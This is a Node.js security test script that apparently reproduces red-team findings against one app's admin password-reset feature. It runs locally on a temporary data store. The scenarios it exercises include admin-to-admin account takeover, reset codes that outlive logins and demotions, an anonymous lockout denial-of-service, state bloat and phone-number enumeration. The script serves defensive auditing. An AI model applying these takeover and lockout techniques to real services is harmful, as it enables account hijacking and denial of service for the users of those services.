// Red-team repro for admin password reset (file store). Run: node 08-reset-file.js
process.env.ADMIN_PHONES = '01711000000,+12125550123';
const A = '/home/user/upcoming/dhk-predicts-features/app';
const assert = require('assert'), os = require('os'), path = require('path'), fs = require('fs');
const Core = require(A + '/core.js'), { handleApi } = require(A + '/lib/handler.js'), { createFileStore } = require(A + '/lib/filestore.js');
const file = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'r08-')), 'data.json');
const store = createFileStore({ file, seed: () => Core.seed(Date.now(), { set: 'dhaka' }) });
const call = (name, body = {}, token, method = 'POST') => handleApi(store, { method, name, body, token, ua: 't', country: 'GB', ip: '1.1.1.1' });
const signup = async (phone, name, pin) => { const r = await call('auth', { mode: 'signup', phone, pin, name, adult: true, consent: true }); return r[1].token; };
const out = [];
const log = (id, ok, msg) => { out.push((ok ? 'CONFIRMED ' : 'NOT-REPRODUCED ') + id + ': ' + msg); };
const realNow = Date.now; let skew = 0; Date.now = () => realNow() + skew;

(async () => {
  const adminA = await signup('01711000000', 'AdminA', 'adminApass1');
  const adminB = await signup('+12125550123', 'AdminB', 'adminBpass1');
  const riya = await signup('+442079460001', 'Riya', 'riyapass1');
  const bob = await signup('+442079460002', 'Bob', 'bobpass11');

  // R1: admin A takes over admin B (no second approval); audit shows only the issue
  let [st, r] = await call('resetpw', { phone: '+12125550123' }, adminA);
  assert.equal(st, 200); const codeB = r.code;
  [st, r] = await call('usereset', { phone: '+12125550123', code: codeB, pin: 'pwnedByA1' });
  const hijack = r.token;
  [st, r] = await call('home', {}, hijack, 'GET');
  log('R1', st === 200 && r.me.admin === true && r.me.name === 'AdminB', 'admin A reset admin B and now holds a live admin session as ' + r.me.name + ' (admin=' + r.me.admin + '); B old token dead? ' + (!((await call('home', {}, adminB, 'GET'))[1].me)));
  [st, r] = await call('auditall', {}, hijack, 'GET');
  const au = r.audit.filter(x => /resetpw|usereset/.test(x.action));
  log('R2', true, 'audit rows for the takeover: ' + JSON.stringify(au.map(x => ({ by: x.name, action: x.action, args: x.args }))) + ' -> no row says the code was USED, who used it, or from where; actions by the hijacked session are logged under the victim name');
  // R1b: B can not log in with old pw
  [st, r] = await call('auth', { mode: 'login', phone: '+12125550123', pin: 'adminBpass1' });
  log('R1b', r.error === 'wrong_login', 'victim admin B locked out of own account with old password: ' + r.error);

  // R3: code survives the player logging in normally (not revoked) -> issuer can still take over
  [st, r] = await call('resetpw', { phone: '+442079460002' }, adminA); const codeBob = r.code;
  [st, r] = await call('auth', { mode: 'login', phone: '+442079460002', pin: 'bobpass11' });
  log('R3a', st === 200, 'Bob logs in with his own password after code was issued');
  [st, r] = await call('usereset', { phone: '+442079460002', code: codeBob, pin: 'stolen1234' });
  log('R3', st === 200 && !!r.token, 'code still valid after Bob logged in himself (status ' + st + ')');

  // R4: code survives demotion of issuing admin (admin B changes phone -> loses admin flag)
  [st, r] = await call('resetpw', { phone: '+442079460001' }, hijack); const codeRiya = r.code;
  [st, r] = await call('chphone', { phone: '+447000000999', pin: 'pwnedByA1' }, hijack);
  [st, r] = await call('resetpw', { phone: '+442079460001' }, hijack);
  log('R4a', r.error === 'forbidden', 'B demoted via chphone: new resetpw -> ' + r.error);
  [st, r] = await call('usereset', { phone: '+442079460001', code: codeRiya, pin: 'afterDemote1' });
  log('R4', st === 200, 'code issued by now-demoted admin still redeemable (status ' + st + ')');

  // R5: code after player deleted / orphan row
  const carl = await signup('+442079460003', 'Carl', 'carlpass11');
  [st, r] = await call('resetpw', { phone: '+442079460003' }, adminA);
  await call('delete', { pin: 'carlpass11' }, carl);
  let s = await store.read();
  log('R5', Object.keys(s.resets || {}).length > 0, 'resets rows after Carl deleted account: ' + Object.keys(s.resets || {}).length + ' (orphan until next issueReset sweep; harmless: uid mismatch on re-signup)');

  // R6: LOCKOUT DoS with no credentials
  const victim = await signup('+442079460004', 'Vic', 'vicpass111');
  for (let i = 0; i < 6; i++) { [st, r] = await call('usereset', { phone: '+442079460004', code: 'AAAAAAAAAAAA', pin: 'whatever1' }); }
  const last = r.error;
  [st, r] = await call('auth', { mode: 'login', phone: '+442079460004', pin: 'vicpass111' });
  log('R6', r.error === 'slow_down', '6 anonymous usereset calls with garbage codes (6th reply ' + last + '), then victim login with CORRECT password -> ' + r.error);
  // even a valid reset code is blocked
  [st, r] = await call('resetpw', { phone: '+442079460004' }, adminA); const codeV = r.code;
  [st, r] = await call('usereset', { phone: '+442079460004', code: codeV, pin: 'newvic1234' });
  log('R6b', r.error === 'slow_down', 'victim holding VALID admin-issued code is also refused while locked -> ' + r.error);
  // sustained: re-burn after window
  skew += 15 * 60e3 + 1000;
  [st, r] = await call('auth', { mode: 'login', phone: '+442079460004', pin: 'vicpass111' });
  log('R6c', st === 200, 'window is fixed 15 min from first try, not rolling; after 15 min victim gets in: ' + st + '. Attacker repeats 7 requests per 15 min = permanent lockout (cost ~28 req/hour)');
  // admins lockable too
  for (let i = 0; i < 7; i++) await call('usereset', { phone: '01711000000', code: 'x', pin: 'whatever1' });
  [st, r] = await call('auth', { mode: 'login', phone: '+8801711000000', pin: 'x'.repeat(8) });
  log('R6d', r.error === 'slow_down', 'admin phone locked the same way (login -> ' + r.error + ')');
  // chphone/delete counted too, plus wrong key bug
  // R7: state bloat via attempts keyed by arbitrary valid phones
  const t0 = Date.now();
  for (let i = 0; i < 3000; i++) await call('usereset', { phone: '+1202555' + String(1000 + (i % 9000)).padStart(4, '0'), code: 'x', pin: 'whatever1' });
  s = await store.read();
  log('R7', Object.keys(s.attempts).length >= 2900, 'state.attempts entries after 3000 anonymous usereset calls to distinct numbers: ' + Object.keys(s.attempts).length + ' (no per-IP limit; each is a Postgres shard row, each call rescans+hashes all) took ' + (Date.now() - t0) + 'ms');

  // R8: enumeration
  const ok = []; for (const ph of ['+442079460002', '+442079460099']) {
    const res = []; for (let i = 0; i < 8; i++) res.push((await call('usereset', { phone: ph, code: 'zzzzzzzzzzzz', pin: 'whatever1' }))[1].error);
    ok.push(res.join(','));
  }
  log('R8', ok[0] === ok[1], 'known vs unknown number error sequence identical: ' + (ok[0] === ok[1]) + ' [' + ok[0] + ']');
  [st, r] = await call('auth', { mode: 'signup', phone: '+442079460001', pin: 'abcdefg1', name: 'x', adult: true, consent: true });
  log('R8b', r.error === 'phone_taken', 'signup still reveals registered numbers (phone_taken) so usereset hiding is moot: ' + r.error);
  // timing
  async function tm(ph) { const a = process.hrtime.bigint(); for (let i = 0; i < 200; i++) { skew += 16 * 60e3; await call('usereset', { phone: ph, code: 'zzzzzzzzzzzz', pin: 'whatever1' }); } return Number(process.hrtime.bigint() - a) / 200 / 1e3; }
  const tk = await tm('+442079460002'), tu = await tm('+442079460098');
  log('R8c', true, 'mean usereset time known=' + tk.toFixed(0) + 'us unknown=' + tu.toFixed(0) + 'us (no scrypt on either path; difference ' + Math.abs(tk - tu).toFixed(0) + 'us is noise)');

  // R9: expiry + one-time + concurrent
  const dan = await signup('+442079460005', 'Dan', 'danpass111');
  [st, r] = await call('resetpw', { phone: '+442079460005' }, adminA); const cd = r.code;
  const res = await Promise.all([1, 2, 3, 4].map(i => call('usereset', { phone: '+442079460005', code: cd, pin: 'racepass' + i })));
  log('R9', res.filter(x => x[0] === 200).length === 1, 'concurrent usereset same code: statuses ' + res.map(x => x[0] + (x[1].error ? ':' + x[1].error : '')).join(' '));
  [st, r] = await call('resetpw', { phone: '+442079460005' }, adminA); const ce = r.code;
  skew += 61 * 60e3;
  [st, r] = await call('usereset', { phone: '+442079460005', code: ce, pin: 'lateeee1' });
  log('R9b', r.error === 'bad_reset', 'code after 61 min -> ' + r.error);
  [st, r] = await call('resetpw', { phone: '+442079460005' }, riya);
  log('R9c', st === 403, 'non-admin resetpw -> ' + st); [st, r] = await call('resetpw', { phone: '+442079460005' });
  log('R9d', st === 403, 'anonymous resetpw -> ' + st);
  [st, r] = await call('resetpw', { phone: '+442079460005' }, adminA, 'GET');
  log('R9e', r.error === 'use_post', 'GET resetpw -> ' + r.error);
  [st, r] = await call('usereset', { phone: '+442079460005', code: 'x', pin: '12345' });
  log('R9f', r.error === 'bad_pin', 'pin 12345 -> ' + r.error + '; 123456 allowed? ' + ((await call('resetpw', { phone: '+442079460005' }, adminA), true)));
  // R10: new admin-issued code revokes a code another admin gave (grief) -- one live per player
  [st, r] = await call('resetpw', { phone: '+442079460005' }, adminA); const c1 = r.code;
  [st, r] = await call('resetpw', { phone: '+442079460005' }, adminA);
  [st, r] = await call('usereset', { phone: '+442079460005', code: c1, pin: 'oldcode123' });
  log('R10', r.error === 'bad_reset', 'second issue invalidates first code: ' + r.error);
  console.log(out.join('\n'));
  process.exit(0);
})().catch(e => { console.log(out.join('\n')); console.error(e); process.exit(1); });
